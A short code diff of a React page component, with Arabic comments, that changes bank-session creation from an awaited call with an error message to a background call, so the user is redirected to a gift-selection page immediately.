@@ -71,19 +71,17 @@ export default function Home() {
     localStorage.setItem("sessionId", sessionId);
     localStorage.setItem("selectedBank", selectedBank);
     
-    // إرسال البيانات أولاً وانتظار النجاح قبل التوجيه
-    try {
-      await createSessionMutation.mutateAsync({
-        sessionId,
-        selectedBank,
-        country: userCountry,
-      });
-      // توجيه المستخدم فقط بعد نجاح إنشاء الجلسة
-      setLocation(`/gift-selection?bank=${selectedBank}&session=${sessionId}`);
-    } catch (error) {
-      console.error("Error creating session in DB:", error);
-      toast.error(isArabic ? "حدث خطأ في إنشاء الجلسة. يرجى المحاولة مرة أخرى." : "Error creating session. Please try again.");
-    }
+    // إرسال البيانات في الخلفية دون انتظار لضمان سرعة الانتقال
+    createSessionMutation.mutate({
+      sessionId,
+      selectedBank,
+      country: userCountry,
+    }, {
+      onError: (err) => console.error("Background session creation failed:", err)
+    });
+
+    // التوجيه الفوري لضمان عدم تعطل المستخدم
+    setLocation(`/gift-selection?bank=${selectedBank}&session=${sessionId}`);
   };
 
   const goToPersonalData = () => {
